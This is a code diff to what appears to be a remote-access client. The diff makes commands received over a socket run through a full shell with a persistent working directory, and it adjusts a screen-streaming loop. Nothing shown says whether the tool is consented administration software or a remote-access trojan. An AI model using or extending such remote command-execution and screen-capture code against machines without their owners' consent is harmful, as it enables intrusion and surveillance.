@@ -258,16 +258,35 @@ def get_system_info():
 
 
 def execute_command(command):
+    # Intercept cd so the process cwd actually changes between commands
+    stripped = command.strip()
+    if stripped.lower().startswith("cd") and len(stripped) > 2 and stripped[2] in (" ", "\t"):
+        target = stripped[3:].strip().strip('"').strip("'")
+        if not target:
+            return os.getcwd()
+        try:
+            os.chdir(target)
+            return os.getcwd()
+        except FileNotFoundError:
+            return f"[!] cd: '{target}' — path not found"
+        except NotADirectoryError:
+            return f"[!] cd: '{target}' — not a directory"
+        except PermissionError:
+            return f"[!] cd: '{target}' — permission denied"
+        except Exception as e:
+            return f"[!] cd error: {e}"
     try:
         if platform.system() == "Windows":
             process = subprocess.Popen(
                 command, shell=True,
-                stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE
+                stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
+                cwd=os.getcwd()
             )
         else:
             process = subprocess.Popen(
-                command.split(), shell=False,
-                stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE
+                command, shell=True,
+                stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
+                cwd=os.getcwd()
             )
         stdout, stderr = process.communicate(timeout=30)
         result = stdout.decode(errors='replace') + stderr.decode(errors='replace')
@@ -372,7 +391,7 @@ def stream_screen(sock, key, stop_event, send_lock):
             with send_lock:
                 send_msg(sock, frame_data, key)
             ack = recv_msg_str(sock, key)
-            if ack != "NEXT":
+            if ack is None or ack not in ("NEXT",):
                 break
     except Exception as e:
         logger.error(f"Stream error: {e}")
